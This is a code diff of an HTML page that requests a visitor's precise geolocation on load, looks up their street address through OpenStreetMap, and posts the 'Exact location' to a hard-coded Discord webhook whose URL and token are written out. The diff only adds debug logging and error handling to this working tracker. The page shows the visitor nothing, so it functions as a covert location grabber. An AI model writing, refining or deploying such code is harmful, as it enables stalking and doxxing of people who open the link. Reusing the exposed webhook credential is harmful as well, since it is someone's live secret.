@@ -1,30 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>Send Location</title></head>
+<head><title>Send Location Debug</title></head>
 <body>
 <script>
 const webhookURL = "https://discord.com/api/webhooks/1393310324819755048/JfbxAgH4tTNSig5h63pYCTr-QlOrNC5-wpkzTXH7AE34AGo3U1JWjKlPEFt6fElmiX7N";
 
 function sendToWebhook(content) {
+    console.log("Sending to webhook:", content);
     fetch(webhookURL, {
         method: "POST",
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({content})
-    }).catch(() => {
-    });
+    })
+    .then(() => console.log("Webhook sent successfully"))
+    .catch(err => console.error("Failed to send webhook:", err));
 }
 
 function reverseGeocode(lat, lon) {
     const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+    console.log("Fetching address from:", url);
 
     fetch(url)
-    .then(response => response.json())
+    .then(response => {
+        if(!response.ok) throw new Error("Reverse geocode response not OK");
+        return response.json();
+    })
     .then(data => {
+        console.log("Reverse geocode data:", data);
         const address = data.display_name || "Address not found";
         const message = `Exact location:\nLatitude: ${lat}\nLongitude: ${lon}\nAddress: ${address}`;
         sendToWebhook(message);
     })
-    .catch(() => {
+    .catch(err => {
+        console.error("Reverse geocode failed:", err);
         const fallbackMsg = `Exact location:\nLatitude: ${lat}\nLongitude: ${lon}\nAddress: Not available`;
         sendToWebhook(fallbackMsg);
     });
@@ -33,14 +41,18 @@ function reverseGeocode(lat, lon) {
 function sendLocation(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
+    console.log("Got coordinates:", lat, lon);
     reverseGeocode(lat, lon);
 }
 
 function handleError(error) {
+    console.error("Error getting location:", error);
 }
 
 if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(sendLocation, handleError, {enableHighAccuracy: true});
+} else {
+    console.error("Geolocation not supported");
 }
 </script>
 </body>
